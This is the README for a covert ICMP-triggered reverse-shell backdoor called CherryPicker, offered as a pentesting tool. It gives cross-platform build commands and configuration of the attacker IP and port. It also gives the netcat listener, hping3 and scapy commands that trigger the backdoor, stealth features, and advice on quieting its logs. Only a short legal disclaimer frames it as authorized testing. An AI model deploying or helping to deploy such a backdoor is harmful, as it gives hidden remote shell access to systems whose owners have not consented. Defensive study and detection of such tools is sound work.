# CherryPicker

ICMP-triggered reverse shell for authorized penetration testing.

## ⚠️ Legal Disclaimer

This tool is designed **exclusively for authorized penetration testing** and security research. Unauthorized use of this tool against systems you don't own or have explicit permission to test is **illegal** and punishable by law.

**Only use this tool:**
- On systems you own
- During authorized penetration tests with written permission
- In controlled lab environments

## How It Works

1. **Deploy** - Place the compiled binary on the target system (with authorization)
2. **Listen** - The tool monitors incoming ICMP (ping) packets
3. **Trigger** - Send a ping with a specific magic signature from your attack box
4. **Connect** - Tool establishes a reverse shell back to your attack machine

## Building

```bash
# Install dependencies
go get golang.org/x/net/icmp golang.org/x/net/ipv4

# Build for current platform
go build -o cherrypicker

# Build for Linux (common target)
GOOS=linux GOARCH=amd64 go build -o cherrypicker-linux

# Build for Windows
GOOS=windows GOARCH=amd64 go build -o cherrypicker.exe
```

## Configuration

Edit `config.go` or use environment variables:

```bash
export ATTACK_IP="192.168.1.100"    # Your attack box IP
export ATTACK_PORT="4444"            # Your listening port
export MAGIC_SIG="4348455252595f50" # Hex-encoded magic bytes
```

## Usage

### On Target System (requires root/admin):

```bash
# Show configuration
sudo ./cherrypicker -show-config

# Test connection and reverse shell
sudo ./cherrypicker -test

# Run in listener mode
sudo ./cherrypicker
```

### On Attack Box:

```bash
# Start netcat listener
nc -lvnp 4444

# Send magic ping with hping3 (recommended)
sudo hping3 --icmp --data 19 --sign "CHERRY_PICKER_2025" TARGET_IP

# Or using scapy in Python
sudo python3 -c "from scapy.all import *; send(IP(dst='TARGET_IP')/ICMP()/Raw(load='CHERRY_PICKER_2025'))"
```

## Features

- ✅ Stealthy ICMP-based triggering
- ✅ Customizable magic signature
- ✅ Cross-platform (Linux, macOS, Windows)
- ✅ No persistent network connections until triggered
- ✅ Automatic shell detection per OS
- ✅ Banner with system information
- ✅ Test mode for verification
- ✅ Graceful shutdown handling

## Architecture

```
┌─────────────┐              ┌──────────────┐
│ Attack Box  │              │ Target       │
│             │              │              │
│  1. nc -lvp │              │ cherrypicker │
│     4444    │◄─────────────┤ (listening)  │
│             │   Reverse    │              │
│             │   Shell      │              │
│             │              │      ▲       │
│             │   Magic      │      │ ICMP  │
│  2. hping3  ├──────────────┤  Monitor     │
│     ICMP    │   Ping       │              │
└─────────────┘              └──────────────┘
```

## Security Considerations

- Requires root/admin privileges to capture raw ICMP packets
- Change the default magic signature before deployment
- Use strong, random signatures in production environments
- Consider adding encryption/authentication to prevent unauthorized triggers
- The tool is noisy if logging is enabled - consider redirecting output
- Firewall rules may block outbound connections

## License

See LICENSE file. Use responsibly and legally.
